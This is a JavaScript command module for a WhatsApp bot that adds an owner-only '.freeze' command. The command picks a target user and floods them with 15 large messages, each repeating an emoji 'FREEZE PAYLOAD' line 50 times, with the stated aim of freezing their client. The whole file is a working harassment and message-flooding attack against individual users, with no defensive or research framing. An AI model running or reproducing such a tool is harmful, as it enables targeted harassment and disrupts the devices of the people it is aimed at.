module.exports = async function(sock, chatId, msg, isOwner, q) {
    if (!isOwner) return await sock.sendMessage(chatId, { text: '\u274C Owner only!' }, { quoted: msg });
    
    try {
        let target;
        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const quoted = msg.message?.extendedTextMessage?.contextInfo?.participant;
        
        if (q) target = q.replace(/\D/g, '') + '@s.whatsapp.net';
        else if (mentioned) target = mentioned;
        else if (quoted) target = quoted;
        else return await sock.sendMessage(chatId, { text: '\u26A0\uFE0F .freeze @user or reply to user' }, { quoted: msg });
        
        await sock.sendMessage(chatId, { text: `\u2744\uFE0F Freezing @${target.split('@')[0]}...`, mentions: [target] }, { quoted: msg });
        
        // Send massive sticker/document to freeze
        for (let i = 0; i < 15; i++) {
            try {
                await sock.sendMessage(target, { 
                    text: '\uD83E\uDDca\uD83E\uDDca\uD83E\uDDca FREEZE PAYLOAD \uD83E\uDDca\uD83E\uDDca\uD83E\uDDca\n'.repeat(50) 
                });
            } catch (e) {}
        }
        
        await sock.sendMessage(chatId, { text: `\u2744\uFE0F Freeze payload sent!` }, { quoted: msg });
    } catch (e) {
        await sock.sendMessage(chatId, { text: '\u274C Error: ' + e.message }, { quoted: msg });
    }
};
